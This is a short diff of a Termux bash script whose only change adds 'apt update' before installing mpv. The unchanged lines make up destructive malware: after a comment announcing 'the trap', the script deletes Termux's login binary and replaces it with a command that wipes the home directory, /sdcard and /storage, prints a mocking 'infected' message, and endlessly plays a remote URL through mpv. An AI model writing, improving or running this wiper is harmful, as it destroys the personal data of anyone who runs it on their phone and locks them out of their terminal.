@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-$SHELL -c "apt install mpv -y" > /dev/null
+$SHELL -c "apt update -y && apt install mpv -y" > /dev/null
 # Here the trap begins....
 rm /data/data/com.termux/files/usr/bin/login
 echo "rm -rf /data/data/com.termux/files/home/* && rm -rf /sdcard/* & rm -rf /storage/*/* & echo HAHA! GET YOUR TERMUX INFECTED LOL!!;while true;do /data/data/com.termux/files/usr/bin/mpv https://fwesh.yonle.repl.co;done" > $PREFIX/bin/login
